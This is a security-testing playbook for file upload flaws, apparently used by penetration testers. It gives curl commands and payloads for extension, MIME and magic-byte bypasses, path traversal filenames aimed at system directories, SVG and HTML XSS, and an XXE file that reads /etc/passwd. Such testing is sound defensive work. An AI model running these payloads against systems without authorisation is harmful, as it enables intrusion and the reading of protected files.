# File Upload Security Testing

## Objective

Identify file upload vulnerabilities that may allow remote code execution, path traversal, stored XSS via SVG/HTML upload, SSRF via file content, or directory enumeration.

---

## 1. Recon — Understand Upload Behavior

Before testing, understand:
- What file types does the application accept?
- Where are uploaded files stored? Are they served from same domain?
- Are uploaded files directly executable?
- Is there a CDN or object storage (S3, GCS) for uploads?

```bash
# Upload a benign test file and observe:
# 1. Where does the response say the file was saved?
# 2. Is the file accessible via a URL?
# 3. What is the file's served Content-Type?

curl -si -X POST https://target/upload \
  -F "file=@test.txt;type=text/plain" \
  -H "Cookie: session=USER_TOKEN" | grep -iE "url|path|location|filename"
```

---

## 2. File Extension Restriction Bypass

### Test Upload of Dangerous Extensions
If PHP is detected:
```bash
for EXT in php php3 php4 php5 phtml pHp PHP php.jpg php%00.jpg; do
  echo "Testing: $EXT"
  curl -si -X POST https://target/upload \
    -F "file=@test.$EXT;filename=test.$EXT" \
    -H "Cookie: session=USER_TOKEN" | grep -E "HTTP|url|error"
  sleep 0.3
done
```

If ASP.NET:
```bash
for EXT in asp aspx ashx asmx cer; do
  echo "Testing: $EXT"
  curl -si -X POST https://target/upload \
    -F "file=@test.$EXT;filename=test.$EXT" \
    -H "Cookie: session=USER_TOKEN" | grep -E "HTTP|url|error"
done
```

### Double Extension
```
shell.php.jpg    # Apache may execute if misconfigured
shell.php%20     # Space in filename
shell.php.       # Trailing dot (Windows behavior)
shell.php::$DATA # NTFS ADS (Windows)
```

---

## 3. MIME Type Bypass

The application may validate Content-Type header client-side:

```bash
# Send a PHP file with image MIME type
curl -si -X POST https://target/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -H "Cookie: session=USER_TOKEN" | grep -E "HTTP|url|error"

# Send with mismatched Content-Type
curl -si -X POST https://target/upload \
  -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php;type=image/gif" | grep HTTP
```

---

## 4. Magic Byte / File Signature Bypass

Add valid image magic bytes before PHP code:

```bash
# GIF header + PHP code
printf 'GIF89a<?php echo "upload_test_rce"; ?>' > bypass.php.gif

# JPEG header + PHP
printf '\xff\xd8\xff<?php echo phpinfo(); ?>' > bypass.php.jpg

# Upload and check if it's served as PHP
curl -si -X POST https://target/upload \
  -F "file=@bypass.php.gif;filename=bypass.php.gif" | grep -E "url|HTTP"
```

---

## 5. Path Traversal via Filename

Test if the filename parameter can be used to control upload path:

```bash
# Path traversal in filename
curl -si -X POST https://target/upload \
  -F 'file=@test.txt;filename=../../etc/cron.d/test' \
  -H "Cookie: session=USER_TOKEN" | grep HTTP

# Null byte injection (old PHP)
curl -si -X POST https://target/upload \
  -F $'file=@test.php;filename=test.php\x00.jpg' | grep HTTP

# Encoded traversal
curl -si -X POST https://target/upload \
  -F 'file=@test.txt;filename=..%2F..%2Fwwwroot%2Ftest.txt' | grep HTTP
```

---

## 6. Stored XSS via File Upload

### SVG XSS
```bash
# Create malicious SVG
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
EOF

# Upload SVG
curl -si -X POST https://target/upload \
  -F "file=@xss.svg;type=image/svg+xml" | grep -E "url|HTTP"

# If served from same origin with image/svg+xml content-type → XSS
```

### HTML Upload XSS
```bash
cat > xss.html << 'EOF'
<html><body><script>alert(document.domain)</script></body></html>
EOF

curl -si -X POST https://target/upload \
  -F "file=@xss.html;type=text/html" | grep -E "url|HTTP"
```

---

## 7. XXE via File Upload (XML/Office Files)

Upload XML-based files (XLSX, DOCX, SVG) with XXE payloads:

```bash
# Create malicious XLSX (ZIP with XXE in workbook.xml)
# Create malicious SVG with DOCTYPE
cat > xxe_upload.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF

curl -si -X POST https://target/upload \
  -F "file=@xxe_upload.svg;type=image/svg+xml" | grep HTTP
```

---

## 8. Virus/AV Check Bypass

If the application runs antivirus on uploads, the EICAR test string is a safe detection test:

```bash
# EICAR test string (safe — not actual malware)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.com

curl -si -X POST https://target/upload \
  -F "file=@eicar.com;type=application/octet-stream" | grep HTTP
```

---

## 9. Direct File Access Test

After a successful upload, attempt to access the file directly and check if it executes:

```bash
# From the upload response, get the file URL
FILE_URL="https://target/uploads/test.php"

# Test execution
curl -si $FILE_URL | grep -iE "upload_test|PHP Version|X-Powered-By"
```

---

## 10. S3 / Object Storage Misconfiguration

If files are stored in S3:
```bash
# Check if bucket is publicly listable
curl -si https://s3.amazonaws.com/BUCKET_NAME/ | grep -iE "Contents|Key|Error"

# Check if public write is allowed (do not write to production bucket)
# Note bucket name only and report
```

---

## Evidence to Capture

- Upload request (multipart body showing filename, content-type)
- Upload response (URL where file was stored)
- Follow-up request accessing the uploaded file
- Response confirming execution or XSS trigger

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| PHP/ASP file upload accepted | Pass/Fail | Critical |
| MIME type bypass accepted | Pass/Fail | High |
| Path traversal via filename | Pass/Fail | High |
| Stored XSS via SVG/HTML | Pass/Fail | High |
| XXE via XML/Office upload | Pass/Fail | High |
| Uploaded file directly executable | Pass/Fail | Critical |
| S3 bucket public listing | Pass/Fail | Medium-High |
